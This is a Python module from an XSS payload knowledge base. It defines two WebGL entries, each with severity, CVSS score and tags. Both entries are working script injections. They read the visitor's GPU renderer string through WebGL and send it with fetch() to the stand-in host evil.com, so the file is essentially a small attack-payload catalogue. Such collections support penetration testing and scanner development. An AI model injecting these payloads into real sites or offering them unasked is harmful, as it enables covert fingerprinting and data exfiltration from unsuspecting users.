#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

WebGL API XSS Payloads
"""

from ..models import PayloadEntry


WEBGL_PAYLOADS = {
    "webgl_1": PayloadEntry(
        payload="<script>var c=document.createElement('canvas');var g=c.getContext('webgl');fetch('//evil.com/?webgl='+g.getParameter(g.RENDERER))</script>",
        contexts=["html_content", "javascript"],
        severity="medium",
        cvss_score=6.0,
        description="WebGL renderer fingerprint",
        tags=["webgl", "fingerprint", "renderer"],
        reliability="high",
    ),
    "webgl_2": PayloadEntry(
        payload="<script>var c=document.createElement('canvas');var g=c.getContext('webgl');var d=g.getExtension('WEBGL_debug_renderer_info');fetch('//evil.com/?gpu='+g.getParameter(d.UNMASKED_RENDERER_WEBGL))</script>",
        contexts=["html_content", "javascript"],
        severity="medium",
        cvss_score=6.5,
        description="WebGL GPU fingerprint",
        tags=["webgl", "fingerprint", "gpu"],
        reliability="high",
    ),
}

WEBGL_PAYLOADS_TOTAL = len(WEBGL_PAYLOADS)
